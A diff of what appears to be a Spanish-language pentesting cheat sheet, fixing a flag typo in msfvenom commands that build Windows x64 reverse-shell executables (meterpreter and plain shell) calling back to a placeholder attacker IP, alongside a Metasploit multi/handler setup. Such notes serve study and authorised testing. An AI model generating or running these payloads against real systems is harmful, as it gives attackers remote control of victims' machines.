@@ -186,7 +186,7 @@ set payload windows/x64/meterpreter/reverse_tcp
 
 - Crear payload
 ```bash
-msfvenom -p windows/x64/meterpreter_reverse_tcp -- platform Windows -a x64 LHOST=ip_ataque LPORT=port_ataque -f exe -o shell.exe
+msfvenom -p windows/x64/meterpreter_reverse_tcp --platform Windows -a x64 LHOST=ip_ataque LPORT=port_ataque -f exe -o shell.exe
 ```
 
 >En **metasploit**
@@ -196,9 +196,10 @@ use exploit/multi/handler
 set payload windows/x64/meterpreter_reverse_tcp
 ```
 
+> **Sin Metasploit**
 
 ```bash
-msfvenom -p windows/x64/shell_reverse_tcp -- platform Windows -a x64 LHOST=ip_ataque LPORT=port_ataque -f exe -o shell.exe
+msfvenom -p windows/x64/shell_reverse_tcp --platform Windows -a x64 LHOST=ip_ataque LPORT=port_ataque -f exe -o shell.exe
 ```
 
 ```bash
